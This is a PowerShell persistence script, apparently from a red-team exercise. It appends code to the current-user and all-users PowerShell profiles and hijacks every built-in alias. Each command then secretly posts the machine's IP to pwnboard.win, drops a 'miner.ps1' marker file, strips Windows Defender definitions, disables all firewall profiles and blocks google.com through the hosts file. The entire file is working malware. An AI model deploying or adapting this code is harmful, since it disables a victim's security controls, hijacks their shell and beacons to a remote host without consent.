
$mm = @'
function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1|Select-Object -ExpandProperty IPV4Address;$i=$i.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
'@
$gg = @'
function gg {$g=[Guid]::newGuid().Guid.Replace("-", "").substring(0,10) + "miner.ps1";New-Item -Path (Join-Path $env:USERPROFILE 'Desktop') -Force -Name $g | Out-Null;}
'@
$dd = @'
function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
'@
$ff = @'
function ff {try{Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False | Out-Null}Catch{}}
'@
$xx = @'
function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" | ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "`r`n0.0.0.0    www.google.com google.com" | Out-Null}Catch{}}}Catch{}}
'@
$orig_dct = @{ }
function cool() {
    param([parameter(ValueFromPipeline)][string]$cmd)
    $value = (Get-Alias -Name $cmd).Definition
    $orig_dct[$cmd] = $value
}

function shim([string]$key, [string]$value) {
    $y = "function shimmed_$key {{$value; Invoke-Expression('mm; gg; xx; dd; ff')}}"
    $tmp = "shimmed_$key"
    $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force'
    $s = $shim.Replace("cmd", $key).Replace("val", $tmp)
    $arr = @()
    $arr += $y
    $arr += $s
    return $arr
}


function write_to([string]$path, [string]$val) {
    Try {
        Add-Content -Path $path -Value $val
    }
    Catch {

    }
}
function main() {
    #$cur_user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    #$env:USERNAME may be modified
    $curuser_allhosts = $PROFILE.CurrentUserAllHosts
    $allusers_allhosts = $PROFILE.AllUsersAllHosts
    if (!(Test-Path -Path $curuser_allhosts)) {
        Try{
        New-Item -ItemType File -Path $curuser_allhosts -Force | Out-Null
        }
        Catch{

        }
    }
    if (!(Test-Path -Path $allusers_allhosts)) {
        Try{
            New-Item -ItemType File -Path $allusers_allhosts -Force | Out-Null
        }
        Catch{}
    }
    Get-Alias | ForEach-Object { $_.Name | cool }
    $orig_dct["?"] = "Where-Object"
    # Only hardcoded because returns 4 different values when doing Get-Alias
    $lst = $orig_dct.Keys | Sort-Object
    $all = @()
    foreach ($key in $lst) {
        $val = $orig_dct[$key]
        $arr = shim $key $val
        $alias_line = $arr[0]
        $func_shim = $arr[1]
        $all += $alias_line
        $all += $func_shim
    }
    try {
        write_to $curuser_allhosts $mm
        write_to $curuser_allhosts $gg
        write_to $curuser_allhosts $dd
        write_to $curuser_allhosts $ff
        write_to $curuser_allhosts $xx
        foreach ($v in $all) {
            write_to $curuser_allhosts $v
        }
    }
    catch { { } }
    try {
        write_to $allusers_allhosts $mm
        write_to $allusers_allhosts $gg
        write_to $allusers_allhosts $dd
        write_to $allusers_allhosts $ff
        write_to $allusers_allhosts $xx
        foreach ($v in $all) {
            write_to $allusers_allhosts $v
        }
    }
    catch { { } }
}

main